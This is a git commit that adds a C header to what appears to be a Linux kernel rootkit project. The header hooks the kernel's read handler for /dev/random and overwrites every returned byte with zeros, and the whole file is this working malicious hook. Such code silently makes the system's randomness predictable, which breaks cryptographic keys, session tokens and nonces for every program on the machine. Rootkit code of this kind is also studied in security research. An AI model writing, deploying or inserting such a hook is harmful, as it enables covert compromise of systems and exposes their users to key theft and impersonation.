c9319908ce50051e7472d70f460080d17db9798f
fs3cs0ciety <fs3cs0ciety@gmail.com>
2024-11-06 14:03:58 -0500

    Create random_read_iter.h

---
+++ src/main-build/hooks/random_read_iter.h
@@ -0,0 +1,37 @@
+#ifndef _RANDOM_READ_ITER_H_
+#define _RANDOM_READ_ITER_H_
+
+static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
+
+static notrace asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
+{
+    int bytes_read, i;
+    long error;
+    char *kbuf = NULL;
+
+    bytes_read = orig_random_read(file, buf, nbytes, ppos);
+    printk(KERN_DEBUG "lkm: intercepted read to /dev/random: %d bytes\n", bytes_read);
+
+    kbuf = kzalloc(bytes_read, GFP_KERNEL);
+    error = copy_from_user(kbuf, buf, bytes_read);
+
+    if(error)
+    {
+        printk(KERN_DEBUG "lkm: %ld bytes could not be copied into kbuf\n", error);
+        kfree(kbuf);
+        return bytes_read;
+    }
+
+    for ( i = 0 ; i < bytes_read ; i++ )
+        kbuf[i] = 0x00;
+
+    error = copy_to_user(buf, kbuf, bytes_read);
+    if (error)
+        printk(KERN_DEBUG "lkm: %ld bytes could not be copied into buf\n", error);
+
+    kfree(kbuf);
+    return bytes_read;
+}
+
+
+#endif
